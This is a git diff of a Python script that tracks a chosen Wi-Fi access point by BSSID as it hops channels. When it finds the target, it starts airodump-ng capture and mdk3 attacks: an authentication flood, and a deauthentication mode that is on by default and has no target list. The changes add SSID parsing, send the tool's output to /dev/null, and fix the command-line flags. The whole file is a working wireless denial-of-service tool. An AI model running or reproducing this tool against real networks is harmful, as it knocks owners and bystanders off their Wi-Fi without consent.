@@ -7,14 +7,19 @@ from typing import Any
 
 import click
 from rich.console import Console
-from rich.traceback import install
 
 from logger import logger
+
+# from rich.traceback import install
+
 
 console: Console = Console()
 
 
-install()
+# install()
+
+
+devnull = open(os.devnull, "wt")
 
 
 class Target:
@@ -29,66 +34,73 @@ class Target:
     def __init__(self, bssid: str) -> None:
         self.bssid = bssid.lower()
         self.channel = None
+        self.ssid = None
 
     def __setattr__(self, name: str, value: Any, /) -> None:
         if hasattr(self, name):
             super().__setattr__(name, value)
-            logger.success(
-                rf"The target was found <b>{self.bssid!r}</b> on <b>{self.channel!r}</b> channel!"
-            )
 
-            logger.info(f"Set up the {_interface_monitored} link.")
-            subprocess.run(["sudo", "ip", "link", "set", _interface_monitored, "up"])
+            if self.bssid and hasattr(self, "ssid") and self.channel:
+                logger.success(
+                    rf"The target was found <b>{self.bssid!r} ({self.ssid})</b> on <b>{self.channel!r}</b> channel!"
+                )
 
-            logger.info(f"Starting the <b>airodump-ng</b> sub process...")
-            threading.Thread(
-                target=subprocess.run,
-                args=(
-                    [
-                        "sudo",
-                        "airodump-ng",
-                        "--wps",
-                        "--uptime",
-                        "--gpsd",
-                        "--manufacturer",
-                        "--ignore-negative-one",
-                        "--bssid",
-                        f"{self.bssid}",
-                        "--channel",
-                        f"{self.channel}",
-                        _interface_monitored,
-                    ],
-                ),
-                kwargs={"stdout": open(os.devnull, "wt")},
-            ).start()
+                logger.info(f"Set up the {_interface_monitored} link.")
+                subprocess.run(
+                    ["sudo", "ip", "link", "set", _interface_monitored, "up"],
+                    stderr=devnull,
+                    stdout=devnull,
+                )
 
-            if _mdk3_a_mode or _mdk3_d_mode:
-                logger.info("Starting the <b>mdk3</b> sub processe(s)...")
-
-            if _mdk3_a_mode:
+                logger.info(f"Starting the <b>airodump-ng</b> sub process...")
                 threading.Thread(
                     target=subprocess.run,
                     args=(
                         [
                             "sudo",
-                            "mdk3",
+                            "airodump-ng",
+                            "--wps",
+                            "--uptime",
+                            "--gpsd",
+                            "--manufacturer",
+                            "--ignore-negative-one",
+                            "--bssid",
+                            f"{self.bssid}",
+                            "--channel",
+                            f"{self.channel}",
                             _interface_monitored,
-                            "a",
-                            "-a",
-                            self.bssid,
-                            "-c",
-                            "-m",
                         ],
                     ),
-                    kwargs={"stdout": open(os.devnull, "wt")},
+                    kwargs={"stdout": devnull, "stderr": devnull},
                 ).start()
 
-            if _mdk3_d_mode:
-                threading.Thread(
-                    target=subprocess.run,
-                    args=(["sudo", "mdk3", _interface_monitored, "d"],),
-                    kwargs={"stdout": open(os.devnull, "wt")},
-                ).start()
+                if _mdk3_a_mode or _mdk3_d_mode:
+                    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
+
+                if _mdk3_a_mode:
+                    threading.Thread(
+                        target=subprocess.run,
+                        args=(
+                            [
+                                "sudo",
+                                "mdk3",
+                                _interface_monitored,
+                                "a",
+                                "-a",
+                                self.bssid,
+                                "-c",
+                                "-m",
+                            ],
+                        ),
+                        kwargs={"stdout": devnull, "stderr": devnull},
+                    ).start()
+
+                if _mdk3_d_mode:
+                    threading.Thread(
+                        target=subprocess.run,
+                        args=(["sudo", "mdk3", _interface_monitored, "d"],),
+                        kwargs={"stdout": devnull, "stderr": devnull},
+                    ).start()
 
         return super().__setattr__(name, value)
 
@@ -99,14 +111,23 @@ class Target:
 def refresh():
     while True:
         logger.info("Killing previous processes...")
-        os.system("sudo pkill -9 mdk3")
-        os.system("sudo pkill -9 airodump-ng")
+
+        os.system("sudo pkill -9 mdk3 > /dev/null 2>&1; ")
+        os.system("sudo pkill -9 airodump-ng > /dev/null 2>&1; ")
 
         logger.info(f"Set down the {_interface_monitored} link.")
-        subprocess.run(["sudo", "ip", "link", "set", _interface_monitored, "down"])
+        subprocess.run(
+            ["sudo", "ip", "link", "set", _interface_monitored, "down"],
+            stderr=devnull,
+            stdout=devnull,
+        )
 
         logger.info(f"Set up the {_interface_managed} link.")
-        subprocess.run(["sudo", "ip", "link", "set", _interface_managed, "up"])
+        subprocess.run(
+            ["sudo", "ip", "link", "set", _interface_managed, "up"],
+            stderr=devnull,
+            stdout=devnull,
+        )
 
         logger.info(f"Scanning...")
         process = subprocess.run(
@@ -117,11 +138,15 @@ def refresh():
         )
 
         logger.info(f"Set down the {_interface_managed} link.")
-        subprocess.run(["sudo", "ip", "link", "set", _interface_managed, "down"])
+        subprocess.run(
+            ["sudo", "ip", "link", "set", _interface_managed, "down"],
+            stderr=devnull,
+            stdout=devnull,
+        )
 
         logger.info(f"Extracting the BSSID and Channel...")
         process = subprocess.run(
-            ["egrep", "^BSS|channel:|set: channel"],
+            ["egrep", "^BSS|SSID:|channel:|set: channel"],
             capture_output=True,
             input=process.stdout,
             text=True,
@@ -140,22 +165,34 @@ def refresh():
                 start, end = search.span()
                 item.append(a[start:end])
 
+            vals = []
             if search := re.search("channel:?.[0-9]{1,}", a):
                 start, end = search.span()
-                item.append(
-                    int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None
+                vals.append(
+                    int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None,
                 )
 
+            if search := re.search("SSID:.*", a):
+                start, end = search.span()
+                vals.append(re.sub("SSID:.", "", a[start:end]))
+            else:
+                vals.append(None)
+
+            item.append(vals)
             lst.append(item)
 
         dct = dict(lst)
 
-        if Target.obj is not None and (channel := dct.get(Target.obj.bssid)):
-            logger.info(f"Update channel to {channel!r}.")
-            Target.obj.channel = channel
+        if Target.obj is not None and (target := dct.get(Target.obj.bssid)):
+            channel, ssid = target
+            if channel:
+                logger.info(f"Update channel to {channel!r}.")
 
-            logger.info(f"Sleep {_interval} for seconds.")
-            sleep(_interval)
+                Target.obj.ssid = ssid
+                Target.obj.channel = channel
+
+                logger.info(f"Sleep {_interval} for seconds.")
+                sleep(_interval)
 
         sleep(2.5)
 
@@ -163,8 +200,8 @@ def refresh():
 @click.command()
 @click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
 @click.option("--interval", type=int, default=60)
-@click.option("--mdk3-a-mode", default=False)
-@click.option("--mdk3-d-mode", default=True)
+@click.option("--mdk3-a-mode", is_flag=True, default=False)
+@click.option("--mdk3-d-mode", is_flag=True, default=True)
 @click.argument("interface_managed")
 @click.argument("interface_monitored")
 def main(
